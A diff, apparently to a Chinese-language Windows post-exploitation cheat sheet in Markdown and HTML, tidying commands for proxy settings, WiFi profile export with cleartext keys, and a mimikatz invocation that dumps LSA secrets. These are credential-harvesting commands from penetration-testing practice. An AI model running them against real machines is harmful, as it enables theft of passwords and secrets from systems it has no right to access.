@@ -105,7 +105,7 @@ schtasks /Query // 计划任务
 ## 浏览器代理
 
 ```
-reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" // 浏览器代理
+reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 ```
 
 ## 启动项
@@ -125,7 +125,7 @@ netsh advfirewall firewall show rule name=all // 2008 2012 防火墙策略
 ## wifi 密码
 
 ```
-netsh wlan export profile interface=WLAN key=clear folder=C:\netsh wlan export profile interface=WLAN key=clear folder=C:\ // 导出 wifi 密码
+netsh wlan export profile interface=WLAN key=clear folder=C:\
 ```
 
 ## 回收站记录
@@ -138,7 +138,7 @@ foreach($file in $Recycler.items()){$file.path;$file.ExtendedProperty("{9B174B33
 ## vpn 连接
 
 ```
-mimikatz.exe "log" "privilege::debug" "token::elevate" "lsadump::sam" "lsadump::secrets" "exit"
+mimikatz.exe "log" "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
 ```
 
 ## 浏览器密码 书签 历史记录 cookies
@@ -355,7 +355,7 @@ setspn -q */* // 所有域的 spn 信息
 
 <h2 id="">浏览器代理</h2>
 
-<pre><code>reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" // 浏览器代理
+<pre><code>reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 </code></pre>
 
 <h2 id="">启动项</h2>
@@ -372,7 +372,7 @@ netsh advfirewall firewall show rule name=all // 2008 2012 防火墙策略
 
 <h2 id="wifi">wifi 密码</h2>
 
-<pre><code>netsh wlan export profile interface=WLAN key=clear folder=C:\netsh wlan export profile interface=WLAN key=clear folder=C:\ // 导出 wifi 密码
+<pre><code>netsh wlan export profile interface=WLAN key=clear folder=C:\
 </code></pre>
 
 <h2 id="">回收站记录</h2>
@@ -383,7 +383,7 @@ foreach($file in $Recycler.items()){$file.path;$file.ExtendedProperty("{9B174B33
 
 <h2 id="vpn">vpn 连接</h2>
 
-<pre><code>mimikatz.exe "log" "privilege::debug" "token::elevate" "lsadump::sam" "lsadump::secrets" "exit"
+<pre><code>mimikatz.exe "log" "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
 </code></pre>
 
 <h2 id="cookies">浏览器密码 书签 历史记录 cookies</h2>
